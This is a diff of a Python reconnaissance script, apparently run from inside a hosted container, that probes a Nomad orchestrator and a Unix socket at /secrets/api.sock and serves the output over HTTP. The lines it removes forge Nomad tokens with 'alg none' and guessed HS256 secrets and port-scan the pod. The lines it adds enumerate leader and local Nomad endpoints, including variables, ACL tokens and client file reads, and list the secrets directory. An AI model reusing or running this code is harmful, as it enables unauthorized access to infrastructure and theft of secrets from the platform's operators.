@@ -5,90 +5,62 @@ import os
 import socket
 import ssl
 import subprocess
-import base64
 
 results = {}
 
-def run_cmd(name, cmd, timeout=8):
+def run_cmd(name, cmd, timeout=10):
     try:
         r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout, shell=isinstance(cmd, str))
         results[name] = {"stdout": r.stdout[:8000], "stderr": r.stderr[:500]}
     except Exception as e:
         results[name] = {"error": str(e)}
 
-# 1. JWT attacks against Nomad
-# Create various JWT tokens to try
-def b64url(data):
-    return base64.urlsafe_b64encode(data.encode()).rstrip(b'=').decode()
-
-# alg: none token
-none_header = b64url('{"alg":"none","typ":"JWT"}')
-claims = b64url('{"sub":"root","policies":["management"],"type":"management","exp":9999999999}')
-jwt_none = f"{none_header}.{claims}."
-
-# HS256 with empty secret
-import hmac, hashlib
-hs256_header = b64url('{"alg":"HS256","typ":"JWT"}')
-hs256_payload = b64url('{"sub":"root","policies":["management"],"type":"management","exp":9999999999}')
-for secret in ['', 'secret', 'nomad', 'password', 'aiven', 'changeme']:
-    sig_input = f"{hs256_header}.{hs256_payload}"
-    sig = base64.urlsafe_b64encode(
-        hmac.new(secret.encode(), sig_input.encode(), hashlib.sha256).digest()
-    ).rstrip(b'=').decode()
-    jwt_hs256 = f"{sig_input}.{sig}"
-    run_cmd(f"nomad_jwt_hs256_{secret or 'empty'}", 
-        f"curl -sk -H 'X-Nomad-Token: {jwt_hs256}' https://169.254.1.2:4646/v1/agent/self 2>&1 | head -c 500")
-
-# alg none
-run_cmd("nomad_jwt_none", 
-    f"curl -sk -H 'X-Nomad-Token: {jwt_none}' https://169.254.1.2:4646/v1/agent/self 2>&1 | head -c 500")
-
-# Try different Nomad endpoints that might be less restricted
-endpoints = [
-    "/v1/status/leader",
-    "/v1/status/peers",
-    "/v1/agent/health",
-    "/v1/agent/members",
-    "/v1/system/gc",
-    "/v1/operator/license",
-    "/v1/namespaces",
-    "/v1/acl/tokens",
-    "/v1/acl/policies",
+# 1. PROBE THE UNIX SOCKET /secrets/api.sock
+sock_paths = [
+    ("sock_root", "/"),
+    ("sock_api", "/api/"),
+    ("sock_api_overview", "/api/overview"),
+    ("sock_api_rawdata", "/api/rawdata"),
+    ("sock_api_routers", "/api/http/routers"),
+    ("sock_api_middlewares", "/api/http/middlewares"),
+    ("sock_api_services", "/api/http/services"),
+    ("sock_api_entrypoints", "/api/entrypoints"),
+    ("sock_dashboard", "/dashboard/"),
+    ("sock_ping", "/ping"),
+    ("sock_health", "/health"),
+    ("sock_v1_agent", "/v1/agent/self"),
+    ("sock_v1_jobs", "/v1/jobs"),
+    ("sock_v1_allocs", "/v1/allocations"),
 ]
-for ep in endpoints:
-    run_cmd(f"nomad_ep_{ep.replace('/','_')}", 
-        f"curl -sk https://169.254.1.2:4646{ep} 2>&1 | head -c 300")
+for name, path in sock_paths:
+    run_cmd(name, f"curl -s --unix-socket /secrets/api.sock 'http://localhost{path}' 2>&1 | head -c 4000")
 
-# 2. Scan pod IP for Traefik
-run_cmd("pod_ip", "ip -4 addr show eth0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1")
+# 2. NOMAD LEADER DIRECT ACCESS
+LEADER = "2a05:d018:1d40:4800:1f92:22bf:5f08:2b17"
+leader_eps = ["/v1/agent/self", "/v1/jobs", "/v1/allocations", "/v1/nodes", "/v1/status/leader"]
+for ep in leader_eps:
+    cname = "leader" + ep.replace("/", "_")
+    run_cmd(cname, f"curl -sk -m 5 'https://[{LEADER}]:4646{ep}' 2>&1 | head -c 1000")
 
-# Get the actual pod IP and scan it
-run_cmd("scan_pod_ip", """
-POD_IP=$(ip -4 addr show eth0 2>/dev/null | grep inet | awk '{print $2}' | cut -d/ -f1)
-if [ -n "$POD_IP" ]; then
-    echo "Pod IP: $POD_IP"
-    for port in 80 443 8080 8443 27305 27000 28000 3000 4180 9090; do
-        (echo > /dev/tcp/$POD_IP/$port) 2>/dev/null && echo "OPEN: $port"
-    done
-fi
-""")
+# Also try HTTP (not HTTPS) to leader
+run_cmd("leader_http", f"curl -s -m 5 'http://[{LEADER}]:4646/v1/status/leader' 2>&1 | head -c 500")
 
-# 3. Check for Unix sockets
-run_cmd("find_sockets", "find / -maxdepth 5 -type s 2>/dev/null | head -20")
+# 3. More Nomad endpoints on local host
+LOCAL = "https://169.254.1.2:4646"
+more_eps = [
+    "/v1/client/stats", "/v1/regions", "/v1/operator/raft/configuration",
+    "/v1/agent/host", "/v1/jobs?prefix=", "/v1/allocations?prefix=",
+    "/v1/evaluations", "/v1/deployments", "/v1/volumes", "/v1/plugins",
+    "/v1/vars", "/v1/var/nomad/jobs",
+    "/v1/client/fs/ls/", "/v1/client/fs/cat/",
+]
+for ep in more_eps:
+    cname = "nomad_" + ep.split("?")[0].replace("/", "_").strip("_")
+    run_cmd(cname, f"curl -sk -m 3 '{LOCAL}{ep}' 2>&1 | head -c 500")
 
-# 4. Network listening details
-run_cmd("ss_full", "ss -tlnp 2>/dev/null")
-run_cmd("ss_all_socks", "ss -xlnp 2>/dev/null")
-
-# 5. Read sidecar stderr for errors/config
-run_cmd("sidecar_stderr", "cat /alloc/logs/sidecar.stderr.0 2>/dev/null | head -50")
-
-# 6. iptables rules
-run_cmd("iptables", "iptables -L -n 2>&1 | head -30")
-run_cmd("ip6tables", "ip6tables -L -n 2>&1 | head -30")
-
-# 7. Try Nomad via HTTPS on other ports
-run_cmd("nomad_443", "curl -sk https://169.254.1.2:443/v1/agent/self 2>&1 | head -c 300")
+# 4. Socket details
+run_cmd("sock_stat", "stat /secrets/api.sock 2>&1")
+run_cmd("ls_secrets", "ls -la /secrets/ 2>&1")
 
 class Handler(http.server.BaseHTTPRequestHandler):
     def do_GET(self):
@@ -99,5 +71,5 @@ class Handler(http.server.BaseHTTPRequestHandler):
     def log_message(self, *args):
         pass
 
-print("Starting probe v8 on port 8080...")
+print("Starting probe v9 on port 8080...")
 http.server.HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
